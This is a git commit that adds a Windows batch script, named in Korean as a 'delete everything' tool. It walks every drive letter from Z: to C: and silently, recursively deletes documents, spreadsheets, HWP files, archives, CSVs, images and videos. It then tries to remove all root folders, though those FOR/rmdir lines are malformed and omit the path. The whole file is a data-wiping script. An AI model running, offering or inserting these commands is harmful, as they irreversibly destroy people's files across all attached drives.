d7fdcb72188f3bdcf1e53511d9eeb158759c2404
thdtjsdn <ssw@b2link.co.kr>
2019-06-16 14:58:48 +0900

    N

---
+++ cmd/전부삭제 - 포멧 미포함/전부삭제/전부삭제.bat
@@ -0,0 +1,477 @@
+z:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("z:\*") DO ( rmdir /s /q )
+
+::
+
+y:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("y:\*") DO ( rmdir /s /q )
+
+::
+
+x:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("x:\*") DO ( rmdir /s /q )
+
+::
+
+w:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("w:\*") DO ( rmdir /s /q )
+
+::
+
+v:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("v:\*") DO ( rmdir /s /q )
+
+::
+
+u:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("u:\*") DO ( rmdir /s /q )
+
+::
+
+t:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("t:\*") DO ( rmdir /s /q )
+
+::
+
+s:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("s:\*") DO ( rmdir /s /q )
+
+::
+
+r:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("r:\*") DO ( rmdir /s /q )
+
+::
+
+q:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("q:\*") DO ( rmdir /s /q )
+
+::
+
+p:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("p:\*") DO ( rmdir /s /q )
+
+::
+
+o:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("o:\*") DO ( rmdir /s /q )
+
+::
+
+n:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("n:\*") DO ( rmdir /s /q )
+
+::
+
+m:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("m:\*") DO ( rmdir /s /q )
+
+::
+
+l:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("l:\*") DO ( rmdir /s /q )
+
+::
+
+k:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("k:\*") DO ( rmdir /s /q )
+
+::
+
+j:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("j:\*") DO ( rmdir /s /q )
+
+::
+
+i:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("i:\*") DO ( rmdir /s /q )
+
+::
+
+h:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("h:\*") DO ( rmdir /s /q )
+
+::
+
+g:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("g:\*") DO ( rmdir /s /q )
+
+::
+
+f:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("f:\*") DO ( rmdir /s /q )
+
+::
+
+e:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("e:\*") DO ( rmdir /s /q )
+
+::
+
+d:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("d:\*") DO ( rmdir /s /q )
+
+::
+
+c:
+cd \
+del /s /q *.zip
+del /s /q *.xls
+del /s /q *.xlsx
+del /s /q *.doc
+del /s /q *.docx
+del /s /q *.hwp
+del /s /q *.ppt
+del /s /q *.pptx
+del /s /q *.csv
+del /s /q *.jpg
+del /s /q *.png
+del /s /q *.mov
+del /s /q *.mp4
+del /s /q *.avi
+FOR /d %i IN ("c:\*") DO ( rmdir /s /q )
